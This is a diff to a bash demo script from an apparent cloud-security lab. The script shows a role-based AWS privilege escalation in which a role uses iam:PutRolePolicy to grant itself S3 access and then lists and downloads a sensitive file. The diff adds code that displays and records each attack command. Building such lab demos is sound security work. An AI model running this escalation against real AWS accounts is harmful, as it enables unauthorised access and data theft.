@@ -3,7 +3,6 @@
 # Demo script for iam:PutRolePolicy privilege escalation to S3 bucket
 # This is a ROLE-BASED self-escalation scenario
 
-set -e
 
 # Disable AWS CLI paging
 export AWS_PAGER=""
@@ -13,6 +12,24 @@ RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 NC='\033[0m' # No Color
+
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
 
 # Configuration
 STARTING_USER="pl-prod-iam-005-to-bucket-starting-user"
@@ -55,6 +72,7 @@ cd - > /dev/null  # Return to scenario directory
 
 # Step 2: Verify identity as user
 echo -e "${YELLOW}Step 2: Verifying identity${NC}"
+show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_IDENTITY"
 
@@ -68,6 +86,7 @@ echo -e "${GREEN}✓ Verified identity as $STARTING_USER${NC}\n"
 echo -e "${YELLOW}Step 3: Assuming starting role${NC}"
 echo "Role ARN: $STARTING_ROLE_ARN"
 
+show_cmd "aws sts assume-role --role-arn \"$STARTING_ROLE_ARN\" --role-session-name \"iam-005-demo-session\""
 ASSUME_ROLE_OUTPUT=$(aws sts assume-role \
     --role-arn "$STARTING_ROLE_ARN" \
     --role-session-name "iam-005-demo-session")
@@ -82,6 +101,7 @@ echo -e "${GREEN}✓ Successfully assumed role $STARTING_ROLE${NC}\n"
 # Step 4: Verify we don't have S3 bucket access yet
 echo -e "${YELLOW}Step 4: Verifying we don't have S3 bucket access yet${NC}"
 echo "Attempting to list S3 bucket contents (should fail)..."
+show_cmd "aws s3 ls s3://$BUCKET_NAME/"
 if aws s3 ls s3://$BUCKET_NAME/ &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have bucket access already${NC}"
 else
@@ -115,6 +135,7 @@ POLICY_DOCUMENT=$(cat <<EOF
 EOF
 )
 
+show_attack_cmd "aws iam put-role-policy --role-name \"$STARTING_ROLE\" --policy-name \"EscalatedS3Access\" --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":[\"s3:ListBucket\",\"s3:GetObject\",\"s3:PutObject\"],\"Resource\":[\"arn:aws:s3:::${BUCKET_NAME}\",\"arn:aws:s3:::${BUCKET_NAME}/*\"]}]}'"
 aws iam put-role-policy \
     --role-name "$STARTING_ROLE" \
     --policy-name "EscalatedS3Access" \
@@ -132,12 +153,14 @@ echo -e "${YELLOW}Step 6: Verifying S3 bucket access${NC}"
 echo "Target bucket: $BUCKET_NAME"
 echo "Listing bucket contents..."
 
+show_attack_cmd "aws s3 ls s3://$BUCKET_NAME/"
 aws s3 ls s3://$BUCKET_NAME/
 echo -e "${GREEN}✓ Successfully listed bucket contents!${NC}\n"
 
 # Step 7: Download sensitive data
 echo -e "${YELLOW}Step 7: Downloading sensitive data${NC}"
 DOWNLOAD_FILE="/tmp/iam-005-sensitive-data.txt"
+show_attack_cmd "aws s3 cp s3://$BUCKET_NAME/sensitive-data.txt $DOWNLOAD_FILE"
 aws s3 cp s3://$BUCKET_NAME/sensitive-data.txt $DOWNLOAD_FILE
 
 echo -e "\n${GREEN}✓ Successfully downloaded sensitive file${NC}"
@@ -158,7 +181,19 @@ echo ""
 echo -e "${YELLOW}Attack Path:${NC}"
 echo -e "  $STARTING_USER → (AssumeRole) → $STARTING_ROLE → (PutRolePolicy on self) → S3 Bucket"
 echo ""
+
+if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+    echo -e "${YELLOW}Attack Commands:${NC}"
+    for cmd in "${ATTACK_COMMANDS[@]}"; do
+        echo -e "  ${CYAN}\$ ${cmd}${NC}"
+    done
+    echo ""
+fi
+
 echo -e "${GREEN}Downloaded file location: $DOWNLOAD_FILE${NC}"
 echo ""
 echo -e "${RED}IMPORTANT: Run cleanup_attack.sh to remove the escalated policy${NC}"
 echo ""
+
+# Mark demo as active for plabs tracking
+touch "$(dirname "$0")/.demo_active"
